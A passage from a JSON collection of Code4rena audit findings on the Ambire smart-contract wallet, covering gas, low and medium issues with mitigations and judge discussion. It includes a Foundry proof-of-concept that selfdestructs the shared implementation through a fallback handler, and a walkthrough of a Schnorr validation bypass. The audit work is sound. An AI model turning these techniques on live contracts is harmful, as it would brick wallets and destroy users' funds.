      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25898",
      "title": "[G-02] Cache variable",
      "impact": "GAS",
      "content": "`sig.length - 1` may be cached in memory in:\n```solidity\nunchecked {\n    modeRaw = uint8(sig[sig.length - 1]);\n}\nsig.trimToSize(sig.length - 1);\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25897",
      "title": "[G-01] `splitSignature()` may be redundant",
      "impact": "GAS",
      "content": "`SignatureValidator.splitSignature()` seems to only be used once in `AmbireAccount.sol#L145`, where only its first return value is used, which is `signature` with its last byte removed. We can thus simply inline `Bytes.trimToSize()` instead:\n\n```diff\n+ import './Bytes.sol';\n...\n- (bytes memory sig, ) = SignatureValidator.splitSignature(signature);\n+ bytes memory sig = Bytes.trimToSize(signature, signature.length - 1);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25896",
      "title": "L-17] [The anti-bricking mechanism only applies to the normal mode, but not the recovery mode",
      "impact": "LOW",
      "content": "\n`recoveryInfoHash` is critical for recovery but is not protected in the same way a signer's own privilege is protected. It is therefore possible for a recovery key to remove its own ability to recover the account, bricking the account.\n\n### Proof of Concept\n\nThe anti-bricking mechanism is supposed to prevent a signer from signing away their own privilege. This is checked by `[require(privileges[signerKey] != bytes32(0), 'PRIVILEGE_NOT_DOWNGRADED');` (`AmbireAccount.sol#L193`) at the end of `AmbireAccount.execute()`. But this presupposes that it was `signerKey` that signed the transaction just executed. This is not the case in the case of a recovery. Then `signerKey` is `signerKeyToRecover` such that `[privileges[signerKeyToRecover] == recoveryInfoHash]` (`AmbireAccount.sol#L153`). `signerKeyToRecover` is supposedly the key we are trying to recover, meaning it is lost, so it doesn't matter what happens to its privileges. We are probably about to give privilege to a new address.\n\nIt seems plausible that this new address might be incorrectly entered, and in this case it is critical that the recovery key (which signed the transaction about to be executed) cannot revoke its own ability to recover, leaving the account with no authorised signer.\nRecovery keys do not operate based on `privileges`, but on there being an appropriate `recoveryInfoHash` set, as noted above. Therefore this value must not be allowed to change, which would be the analogous anti-bricking mechanism for recoveries.\n\n### Recommended Mitigation Steps\n\nAt a minimum simply check that `privileges[signerKeyToRecover] == recoveryInfoHash` still.\n\nBut note that we might actually want to be able to set `privileges[signerKeyToRecover] = 0` for fear that the lost key might become compromised. Currently, this is not possible. It would be acceptable to move `recoveryInfoHash` somewhere else, i.e. `privileges[someOtherSignerKeyToRecover] = recoveryInfoHash`. Note that `someOtherSignerKeyToRecover` may actually be an arbitrary address; it is only used to retrieve `recoveryInfoHash`. So it is not critical that `someOtherSignerKeyToRecover` is a valid address that we can sign with; we can still use it to recover with.\n\nAn alternative could then be, to allow `privileges[signerKeyToRecover] == 0` for recoveries being finalised and instead require that `privileges[someOtherSignerKeyToRecover] == recoveryInfoHash` for `someOtherSignerKeyToRecover`. This can be seen as having two separate but analogous anti-bricking mechanisms, one for normal execution and one for recovery.\n\n### Assessed type\nInvalid Validation\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "https://github.com/code-423n4/2023-05-ambire-findings/issues/32",
      "tags": [],
      "finders": []
    },
    {
      "id": "25895",
      "title": "L-16] [Transactions bundles signed for a future nonce cannot be cancelled",
      "impact": "LOW",
      "content": "\nTransaction bundles signed for a future nonce cannot be cancelled, except by possibly and unfeasibly, many calls to `execute()`.\n\n### Proof of Concept\n\n`AmbireAccount.execute()` validates a signature against a hash based on an incrementing nonce (`AmbireAccount.sol#L138`). Only a transaction bundle hash with the current nonce can be executed. A signature for the current nonce may thus be invalidated by signing a dummy transaction bundle, which only causes the nonce to increment, rendering the undesirable signature forever inexecutable. But if a transaction bundle is signed for a nonce in the future, either by mistake or in anticipation of a `executeMultiple()` call, the only way to cancel the signature would be to repeatedly call `execute()` until the nonce has passed. This might cost significant gas (the signed nonce might be arbitrarily high), and the transaction bundle might then be executed anyway by a frontrunner.\n\n### Recommended Mitigation Steps\nImplement a mapping which stores cancelled transaction bundle hashes, and check this before executing.\n\n### Assessed type\nContext\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "https://github.com/code-423n4/2023-05-ambire-findings/issues/31",
      "tags": [],
      "finders": []
    },
    {
      "id": "25894",
      "title": "L-15] [`require(sp != 0);` fails to protect Schnorr signature validation",
      "impact": "LOW",
      "content": "\nAn incorrect check drastically reduces the security of Schnorr validation. Whether it is completely broken depends on whether fixed points can be found for `keccak256(f(x))`.\n\n### Proof of Concept\n\nSchnorr signatures are validated like this:\n\n```solidity\n} else if (mode == SignatureMode.Schnorr) {\n// px := public key x-coord\n// e := schnorr signature challenge\n// s := schnorr signature\n// parity := public key y-coord parity (27 or 28)\n// last uint8 is for the Ambire sig mode - it's ignored\nsig.trimToSize(sig.length - 1);\n(bytes32 px, bytes32 e, bytes32 s, uint8 parity) = abi.decode(sig, (bytes32, bytes32, bytes32, uint8));\n// ecrecover = (m, v, r, s);\nbytes32 sp = bytes32(Q - mulmod(uint256(s), uint256(px), Q));\nbytes32 ep = bytes32(Q - mulmod(uint256(e), uint256(px), Q));\n\nrequire(sp != 0);\n// the ecrecover precompile implementation checks that the `r` and `s`\n// inputs are non-zero (in this case, `px` and `ep`), thus we don't need to\n// check if they're zero.\naddress R = ecrecover(sp, parity, px, ep);\nrequire(R != address(0), 'SV_ZERO_SIG');\nrequire(e == keccak256(abi.encodePacked(R, uint8(parity), px, hash)), 'SV_SCHNORR_FAILED');\nreturn address(uint160(uint256(px)));\n```\n\n`ecrecover(sp, parity, px, ep)`\n`ecrecover(m, v, r, s)` returns a hash of `(1/r) * (s*P - m*G)`, where `P` is a point derived from `r` and `v`, and the operations are to be interpreted as elliptic curve point operations. In our case, where `ecrecover(sp, parity, px, ep)`, we get `(1/px) * (ep*P - sp*G)`. We see that if `sp % Q == 0` then `G*sp == O`, where `O` is the identity; because `Q` is the order of `G`, so `(1/px) * (ep*P - sp*G) = ep/px * P`. This means we could make ANY public key `px` pass validation in `ecrecover`.\n\nAchieving `sp % Q == 0` should have been prevented by `require(sp != 0);`, which fails to consider that `sp == Q` is equally impermissible. In fact, the check cannot trigger because `sp > 0` since `mulmod(uint256(s), uint256(px), Q) < Q`.\nSo if we simply let `s == 0`, which we are free to do, then `sp` evaluates to `bytes32(Q - mulmod(0, uint256(px), Q)) == bytes32(Q - 0) == bytes32(Q)`, which leads to the issue described above.\n\nIf this was normal ECDSA validation it would already have been broken. But we now also require that `e == keccak256(abi.encodePacked(R, uint8(parity), px, hash))`. Recall that `R = ep/px * P`. We can therefore consider `R` a function of `e`. `R` is then hashed with `px` and `hash`, which are predetermined values that we want to attack. This line can therefore be thought of as a keccak256-based hash function `H` of `e`. Therefore, we have the problem of finding an `e` such that `e == H(e)`.\n\nFinding this enables the attacker to validate and execute any transaction hash.\n\nkeccak256 is considered safe against pre-image attacks, i.e. given `y` find `x` such that `y == keccak256(x)`. But finding a fixed point, i.e. `e` such that `e == H(e)` may be considerably easier. I have been unable to confirm whether it is known to be possible for keccak256, [ but it does seem possible for `sha256`](https://crypto.stackexchange.com/questions/48580/fixed-point-of-the-sha-256-compression-function). Considering that [SHA-1 has already been broken for a chosen-prefix attack](https://sha-mbles.github.io/), it does not seem unrealistic that a fixed point attack will be achievable in this case.\n\n### Recommended Mitigation Steps\nFortunately, this is trivial to mitigate:\n```solidity\n- require(sp != 0);\n+ require(sp != Q);\n```\n\nsince `0 < sp <= Q`. Or, for peace of mind, `require(sp % Q != 0)`.\n\n### Assessed type\nInvalid Validation\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "https://github.com/code-423n4/2023-05-ambire-findings/issues/30",
      "tags": [],
      "finders": []
    },
    {
      "id": "25893",
      "title": "[L-14] Typos",
      "impact": "LOW",
      "content": "\nInstances:<br>\ncontracft -> contract (`AmbireAccountFactory.sol#L15`)<br>\n`// bytes4(keccak256(\"isValidSignature(bytes32,bytes)\") -> // bytes4(keccak256(\"isValidSignature(bytes32,bytes)\"))`(`AmbireAccount.sol#L243`)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25892",
      "title": "[L-13] Use `uint256` instead of `uint`",
      "impact": "LOW",
      "content": "Consider using the explicit `uint256` consistently instead of its alias `uint`.\n\nInstances:<br>\n`AmbireAccount.sol#L15`<br>\n`AmbireAccount.sol#L62`<br>\n`AmbireAccount.sol#L63`<br>\n`AmbireAccount.sol#L94`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25891",
      "title": "[L-12] Group order denoted `Q` may be confused with the public key",
      "impact": "LOW",
      "content": "In `SignatureValidator.sol`, the Schnorr signature scheme group order is denoted `Q`. While in the context of Schnorr signatures, a lowercase `'q'` is sometimes used to denote the group order. This particular Schnorr signature scheme uses the subgroup generated by the secp256k1 base point, the order of which is usually denoted `n`. I.e. the value which is here denoted `Q` is usually known as `n`. Furthermore, secp256k1 is primarily thought of in the context of ECDSA, where `Q` usually denotes the public key.\nConsider renaming `Q` to `n`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25890",
      "title": "[L-11] Redundant require/revert",
      "impact": "LOW",
      "content": "In `SignatureValidator.recoverAddrImpl()` it is first checked that `require(modeRaw < uint8(SignatureMode.LastUnused), 'SV_SIGMODE');` (`SignatureValidator.sol#L49`). This ensures that `SignatureMode mode = SignatureMode(modeRaw);` will be one of the available signature modes. Each of these modes is then considered and the function returns in each case. But at the end of the function, there is a `revert('SV_TYPE');` (`SignatureValidator.sol#L120`). This line can therefore not be reached.\nConsider removing either of these checks, as they have the same effect.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25889",
      "title": "[L-10] It makes more sense to check `signatures.length > 0` than `signer != address(0)` for multisigs",
      "impact": "LOW",
      "content": "In `SignatureValidator.recoverAddrImpl()` for `SignatureMode.Multisig`, it is checked that last `signer != address(0)` (`SignatureValidator.sol#L92`) after validating each signature in the array `signatures`. This can be `address(0)` only if `signatures.length == 0`, in which case the for-loop is skipped, leaving `signer` unassigned. It would make more sense to instead check `require(signatures.length != 0, 'SV_ZERO_SIG');`, just after L85.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25888",
      "title": "[L-09] `AmbireAccount.constructor()` does not allow for custom privileges",
      "impact": "LOW",
      "content": "`AmbireAccount.constructor()` only sets `privileges[addrs[i]] = bytes32(uint(1));` (`AmbireAccount.sol#L62`). A second call is necessary to set the remaining `privileges`, at `FALLBACK_HANDLER_SLOT` and the value `recoveryInfoHash`.\nConsider adding a parameter with the values to set at `addrs`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25887",
      "title": "[L-08] Non-scheduled recoveries can be cancelled",
      "impact": "LOW",
      "content": "When a recovery is cancelled, `LogRecoveryCancelled` is emitted (`AmbireAccount.sol#L173`). This happens even if the recovery wasn't previously scheduled, giving a false impression that it was. Consider reverting attempts to cancel a recovery that hasn't already been scheduled.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25886",
      "title": "[L-07] Error message with opposite meaning",
      "impact": "LOW",
      "content": "The anti-bricking checks return `PRIVILEGE_NOT_DOWNGRADED` if the sender/signer key removes their own privilege. If this is attempted, this error message suggests that the privilege should have been downgraded but wasn't, which is the opposite of what is intended. The error message should therefore rather be `PRIVILEGE_DOWNGRADED` or `PRIVILEGE_MUST_NOT_BE_DOWNGRADED` or similar.\n\nInstances:<br>\n`AmbireAccount.sol#L193`\n`AmbireAccount.sol#L207`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25885",
      "title": "[L-06] Consider indexing unindexed events",
      "impact": "LOW",
      "content": "Instances:<br>\n`AmbireAccountFactory.sol#L7`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25884",
      "title": "[L-05] `LogPrivilegeChanged` does not adequately describe the change",
      "impact": "LOW",
      "content": "`LogPrivilegeChanged(addr, priv)` is emitted when the privilege of `addr` is changed to `priv` (`AmbireAccount.sol#L115`) (also in the constructor, but there it is first set, rather than changed). Since the previous value is not emitted, it is difficult to know whether and how it was meaningfully changed; especially considering that privileges are `bytes32`, but generally carry their meaning only in being non-zero, but may also encode for recovery and the fallback handler.\nConsider including the previous privilege in the event, and perhaps emit a different event when the fallback handler is changed and when the recovery info hash is set. This would then probably involve creating a separate function for setting this.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25883",
      "title": "[L-04] Schnorr signature length is not checked",
      "impact": "LOW",
      "content": "When `SignatureValidator.recoverAddrImpl()` (`SignatureValidator.sol#L63`) is called with a Schnorr signature, it is not checked that it has the correct length, unlike for `SignatureMode.EIP712` and `SignatureMode.EthSign`.\nConsider checking that `sig`, before trimming, has a length of `129` (`(bytes32, bytes32, bytes32, uint8)` plus the `modeRaw` byte).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25882",
      "title": "[L-03] Schnorr signature validation may be incompatible with the intended signers",
      "impact": "LOW",
      "content": "The Schnorr signature scheme implemented for validation in `SignatureValidator.recoverAddrImpl()` (`SignatureValidator.sol#L63-L82`) is engineered to leverage Ethereums `ecrecover` for its calculations. It also uses a specific hash function (keccak256 of a certain encoding of data). As far as I can tell, this is not a standard Schnorr scheme. It is important to note, that both the signer and validator must agree on the same group and hash function. The implemented Schnorr validation will not work with any other Schnorr scheme.\nConsider whether `AmbireAccount` is expected to interface with other Schnorr scheme implementations, and if so, make sure that the same Schnorr scheme is used.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25881",
      "title": "[L-02] Fallback handler should not be allowed to be `this`",
      "impact": "LOW",
      "content": "In `AmbireAccount.sol`, if `address(uint160(uint(privileges[FALLBACK_HANDLER_SLOT]))) == address(this)`, anyone could call the functions protected by `require(msg.sender == address(this), 'ONLY_IDENTITY_CAN_CALL');`, with obvious and disastrous consequences. This seems like an unnecessary attack surface to expose. Consider checking this is not the case, either when setting the privileges (in `setAddrPrivilege()`) or in the fallback itself.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25880",
      "title": "[L-01] `AmbireAccountFactory.deploySafe()` does not guarantee that no call hasn't already been made on the deployed contract",
      "impact": "LOW",
      "content": "When deploying and executing (`AmbireAccountFactory.sol#L24`), it is possible that another one of the privileged signers might have made a call on the already deployed contract, changing its state. While this can only be one of the designated signers with privilege as set by the deployer, it may be against the wishes of the deployer that someone else makes a first function call.\nConsider allowing only a single address with privilege in the constructor, such that the deployer would be the only one who could make a first call.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25879",
      "title": "[M-05] AmbireAccount implementation can be destroyed by privileges",
      "impact": "MEDIUM",
      "content": "\nThe `AmbireAccount` implementation can be destroyed, resulting in the bricking of all associated wallets.\n\nThe `AmbireAccount` contract has a constructor that sets up privileges. These are essentially addresses that have control over the wallet.\n\n```solidity\n58: \tconstructor(address[] memory addrs) {\n59: \t\tuint256 len = addrs.length;\n60: \t\tfor (uint256 i = 0; i < len; i++) {\n61: \t\t\t// NOTE: privileges[] can be set to any arbitrary value, but for this we SSTORE directly through the proxy creator\n62: \t\t\tprivileges[addrs[i]] = bytes32(uint(1));\n63: \t\t\temit LogPrivilegeChanged(addrs[i], bytes32(uint(1)));\n64: \t\t}\n65: \t}\n```\n\nNormally, this constructor is not really used, as wallets are deployed using proxies. The proxy constructor is the actual piece of code that sets up the privileges storage to grant initial permission to the owner of the wallet.\n\nHowever, these proxies need to rely on a reference implementation of the `AmbireAccount` contract. A single contract is deployed and its address is then injected into the proxy code.\n\nThe main issue is, privileges defined in the reference implementation have control over that instance, and could eventually force a destruction of the contract using a fallback handler with a `selfdestruct` instruction (see PoC for a detailed explanation). This destruction of the implementation would render all wallets non-functional, as the proxies won't have any underlying logic code. Consequently, wallets would become inaccessible, resulting in a potential loss of funds.\n\nIt is not clear of the purpose of this constructor in the `AmbireAccount` contract. It may be present to facilitate testing. This issue can be triggered by a malicious deployer (or any of the defined privileges) or by simply setting up a wrong privilege accidentally. Nevertheless, its presence imposes a big and unneeded security risk, as the destruction of the reference implementation can render **all** wallets useless and inaccessible.\n\n### Proof of Concept\n\nThe following test reproduces the described issue. A deployer account deploys the implementation of the `AmbireAccount` contract that is later used by the user account to create a proxy (`AccountProxy` contract) over the implementation. The deployer then forces the destruction of the reference implementation, using a fallback handler (`Destroyer` contract). The user's wallet is now inaccessible, as there is no code behind the proxy.\n\nThe majority of the test is implemented in the `setUp()` function, in order to properly test the destruction of the contract (in Foundry, contracts are deleted when the test is finalized).\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/79248a4fdf436eb3044e87cfffc9d8f7).\n\n```solidity\ncontract Destroyer {\n    function destruct() external {\n        selfdestruct(payable(address(0)));\n    }\n}\n\ncontract AccountProxy is ERC1967Proxy {\n    // Simulate privileges storage\n    mapping(address => bytes32) public privileges;\n\n    constructor(address[] memory addrs, address _logic) ERC1967Proxy(_logic, \"\") {\n\t\tuint256 len = addrs.length;\n\t\tfor (uint256 i = 0; i < len; i++) {\n\t\t\t// NOTE: privileges[] can be set to any arbitrary value, but for this we SSTORE directly through the proxy creator\n\t\t\tprivileges[addrs[i]] = bytes32(uint(1));\n\t\t}\n\t}\n}\n\ncontract AuditDestructTest is Test {\n    AmbireAccount implementation;\n    AmbireAccount wallet;\n\n    function setUp() public {\n        // Master account implementation can be destroyed by any of the configured privileges\n        address deployer = makeAddr(\"deployer\");\n        address user = makeAddr(\"user\");\n\n        // Lets say deployer creates reference implementation\n        address[] memory addrsImpl = new address[](1);\n        addrsImpl[0] = deployer;\n        implementation = new AmbireAccount(addrsImpl);\n\n        // User deploys wallet\n        address[] memory addrsWallet = new address[](1);\n        addrsWallet[0] = user;\n        wallet = AmbireAccount(payable(\n            new AccountProxy(addrsWallet, address(implementation))\n        ));\n\n        // Test the wallet is working ok\n        assertTrue(wallet.supportsInterface(0x4e2312e0));\n\n        // Now privilege sets fallback\n        Destroyer destroyer = new Destroyer();\n        AmbireAccount.Transaction[] memory txns = new AmbireAccount.Transaction[](1);\n        txns[0].to = address(implementation);\n        txns[0].value = 0;\n        txns[0].data = abi.encodeWithSelector(\n            AmbireAccount.setAddrPrivilege.selector,\n            address(0x6969),\n            bytes32(uint256(uint160(address(destroyer))))\n        );\n        vm.prank(deployer);\n        implementation.executeBySender(txns);\n\n        // and destroys master implementation\n        Destroyer(address(implementation)).destruct();\n    }\n\n    function test_AmbireAccount_DestroyImplementation() public {\n        // Assert implementation has been destroyed\n        assertEq(address(implementation).code.length, 0);\n\n        // Now every wallet (proxy) that points to this master implementation will be bricked\n        wallet.supportsInterface(0x4e2312e0);\n    }\n}\n```\n### Recommendation\n\nRemove the constructor from the `AmbireAccount` contract.\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/10#issuecomment-1566179847):**\n >There is a constructor but no initializer; so I don't get how a wallet could be deployed behind a minimal proxy: how do you set the first privilege addresses?\n> \n> It seems that either the constructor needs to be changed to an initializer, or the intent is to deploy the whole bytecode for every wallet.\n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/10#issuecomment-1567752167):**\n > @Picodes - we use a completely different mechanism in which we generate bytecode, which directly `SSTORES` the relevant `privileges` slots.\n> \n> We absolutely disagree with using an initializer. It is leaving too much room for error, as it can be seen from the two Parity exploits.\n> \n> That said, this finding is valid, and removing the constructor is one solution. Another is ensuring we deploy the implementation with no privileges. \n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/10#issuecomment-1568575519):**\n > @Picodes - we are in the process of fixing this by removing the constructor.\n> \n> I would say this finding is excellent, but I am considering whether the severity should be degraded, as once the implementation is deployed with empty `privileges`, this issue doesn't exist. You can argue that this creates sort of a \"trusted setup\", where someone needs to watch what we're deploying, but this is a fundamental effect anyway, as someone needs to watch whether we're deploying the right code. The way we'll mitigate this in the future when we're deploying is by pre-signing deployment transactions with different gas prices and different networks and placing them on github for people to review, or even broadcast themselves.\n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/10#issuecomment-1568829690):**\n > @Picodes - we decided to remove the constructor, because it just makes things more obvious (production privileges are not set via the constructor).\n> \n>With that said, I just remembered that this vulnerability is mitigated by the fact the implementation will be deployed via `CREATE2` and can be re-deployed\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/10#issuecomment-1570397729):**\n > So:\n>  - This is in the end a trust issue and the report shows how the team could have used the constructor to grief users.\n>  - The fact that the implementation is deployed via `CREATE2` doesn't change the severity, as the team could still be malicious. If anything, it makes it even worse because it creates a scenario where the team could blackmail users to get paid for the redeployment.\n>  \n>  Overall, considering that there shouldn't be any trust assumption in this repository, I think Medium severity is appropriate, under [\"the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements\"](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).\n\n*Note: for full discussion, see [here](https://github.com/code-423n4/2023-05-ambire-findings/issues/10)*\n\n**[Ambire mitigated:](https://github.com/code-423n4/2023-06-ambire-mitigation#mitigations-to-be-reviewed)**<br>\n> To mitigate this and avoid confusion, we removed the constructor as it's not used anyway.\n\n**Status:** Mitigation confirmed. Full details in reports from [adriro](https://github.com/code-423n4/2023-06-ambire-mitigation-findings/issues/18), [carlitox477](https://github.com/code-423n4/2023-06-ambire-mitigation-findings/issues/5), and [rbserver](https://github.com/code-423n4/2023-06-ambire-mitigation-findings/issues/11).\n\n***\n\n",
      "summary": "\nA bug was found in the `AmbireAccount` contract, which can lead to the bricking of all associated wallets. The constructor of the `AmbireAccount` contract sets up privileges which are essentially addresses that have control over the wallet. Normally, this constructor is not used as wallets are deployed using proxies. However, the proxies need to rely on a reference implementation of the `AmbireAccount` contract. The main issue is, privileges defined in the reference implementation have control over that instance, and could eventually force a destruction of the contract using a fallback handler with a `selfdestruct` instruction. This destruction of the implementation would render all wallets non-functional, as the proxies won't have any underlying logic code and wallets would become inaccessible, resulting in a potential loss of funds. \n\nThe issue can be triggered by a malicious deployer (or any of the defined privileges) or by simply setting up a wrong privilege accidentally. A proof of concept was created to reproduce the described issue. It was found that the majority of the test was implemented in the `setUp()` function, in order to properly test the destruction of the contract.\n\nTo mitigate this issue, Ambire decided to remove the constructor from the `AmbireAccount` contract. This was confirmed by reports from three different judges, and the issue has now been successfully mitigated.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "https://github.com/code-423n4/2023-05-ambire-findings/issues/10",
      "tags": [],
      "finders": [
        "adriro"
      ]
    },
    {
      "id": "25878",
      "title": "[M-04] Project may fail to be deployed to chains not compatible with Shanghai hardfork",
      "impact": "MEDIUM",
      "content": "\nCurrent settings may produce incompatible bytecode with some of the chains supported by the protocol.\n\nThe Ambire wallet supports and targets different chains, such as Ethereum, Polygon, Avalanche, BNB, Optimism, Arbitrum, etc. This information is available on [their website](https://www.ambire.com/).\n\nAll of the contracts in scope have the version pragma fixed to be compiled using Solidity 0.8.20. This [new version of the compiler](https://github.com/ethereum/solidity/releases/tag/v0.8.20) uses the new `PUSH0` opcode introduced in the Shanghai hard fork, which is now the default EVM version in the compiler and the one being currently used to compile the project.\n\nHere is an excerpt of the bytecode produced for the `AmbireAccount` contract, in which we can see the presence of the `PUSH0` opcode (full bytecode can be found in the file `artifacts/contracts/AmbireAccount.sol/AmbireAccount.json`):\n\n![byecode](https://i.ibb.co/pwNXzps/carbon.png)\n\nThis means that the produced bytecode for the different contracts won't be compatible with the chains that don't yet support the Shanghai hard fork.\n\nThis could also become a problem if different versions of Solidity are used to compile contracts for different chains. The differences in bytecode between versions can impact the deterministic nature of contract addresses, potentially breaking counterfactuality.\n\n### Recommendation\n\nChange the Solidity compiler version to 0.8.19 or define an evm version, which is compatible across all of the intended chains to be supported by the protocol (see <https://book.getfoundry.sh/reference/config/solidity-compiler?highlight=evm_vers#evm_version>).\n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/12#issuecomment-1565217229):**\n > Valid finding. Do you know of any big mainstream chains that do not support PUSH0?\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/12#issuecomment-1566073476):**\n > @Ivshti - I haven't checked for myself, but it seems Arbitrum doesn't support PUSH0 yet. For example https://github.com/ethereum/solidity/issues/14254\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/12#issuecomment-1566074725):**\n > Regarding the severity of the finding, I don't think the generic finding of \"this contract uses 0.8.20, so won't work on some L2s\" is of Medium severity as there is 0 chance that this leads to a loss of funds in production (the team will obviously see that it doesn't work and just change the compiler version).\n> \n> However, in this context, I do agree with the warden that \"the differences in bytecode between versions can impact the deterministic nature of contract addresses, potentially breaking counterfactuality\". Therefore, Medium severity seems appropriate.\n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2023-05-ambire-findings/issues/12#issuecomment-1567748924):**\n > Solved.\n\n**[Ambire mitigated:](https://github.com/code-423n4/2023-06-ambire-mitigation#mitigations-to-be-reviewed)**<br>\n> Downgrade Solidity to allow deploying on pre-Shanghai networks.\n\n**Status:** Mitigation confirmed. Full details in reports from [adriro](https://github.com/code-423n4/2023-06-ambire-mitigation-findings/issues/17), [carlitox477](https://github.com/code-423n4/2023-06-ambire-mitigation-findings/issues/4), and [rbserver](https://github.com/code-423n4/2023-06-ambire-mitigation-findings/issues/12).\n\n***\n\n",
